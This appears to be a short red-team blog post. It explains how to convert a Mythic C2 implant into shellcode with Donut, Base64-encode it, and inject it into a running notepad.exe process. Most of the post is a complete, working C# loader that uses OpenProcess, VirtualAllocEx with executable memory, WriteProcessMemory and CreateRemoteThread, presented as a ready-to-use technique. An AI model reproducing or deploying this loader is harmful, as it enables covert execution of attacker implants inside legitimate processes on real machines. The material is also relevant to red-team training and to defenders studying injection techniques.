This is a quick post to show how you can inject your .NET assembly code to unmanaged processes.

### Generate the ShellCode

As an example, I will be using a Mythic implant. But feel free to develop your own payload.

For this task we will use the Donut project, you can read more about it [here.](https://github.com/TheWover/donut)

The syntax is very simple, we need to indicate our payload (-f), the Class preceded by the Namespace (c) and the method to be executed (m). You can specify the system architecture (-a), with 1 for x86 and 2 for amd64:

```powershell
.\donut.exe -f .\atlas_callback.exe -c Atlas.Program -m Main -a 2
```
![](/images/2021-02-10-10-20-35.png)

If all goes well, the file "payload.bin" will be created in the local folder of the project.

![](/images/2021-02-10-10-23-41.png)

This file can already be used in the injection process, but let's do it differently. We will convert the file to Base64 and place it within our code, so we don't need to reference a file inside our final code.

```powershell
[Convert]::ToBase64String([IO.file]::ReadAllBytes((get-location).path + "\payload.bin")) | out-file payload.b64
```
![](/images/2021-02-10-10-29-18.png)
### Process Injection

The code below is a basic implementation of process injection, using _VirtualAllocEx_, _WriteProcessMemory_ and _CreateRemoteThread_. I added a few lines to receive our payload in the necessary format and that's it.

Replace your Base64 payload in the code below and remember to start the chosen process as a target.

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

namespace Injection {
    class Program {
    
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        public static void Main(string[] args) {

            string s = @"<B64PAYLOAD>";
            byte[] buf = Convert.FromBase64String(s);
            
            Process[] npProc = Process.GetProcessesByName("notepad");
            int pid = npProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x00002000 | 0x00001000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}
```
### Conclusion

That's it! Your code will be executed within the target process.

In my case, I can confirm by looking at the callback in Mythic and crossing with the PID of the target process (notepad.exe):

![](/images/2021-02-10-10-45-49.png)
![](/images/2021-02-10-10-42-09.png)

Happy Hacking!
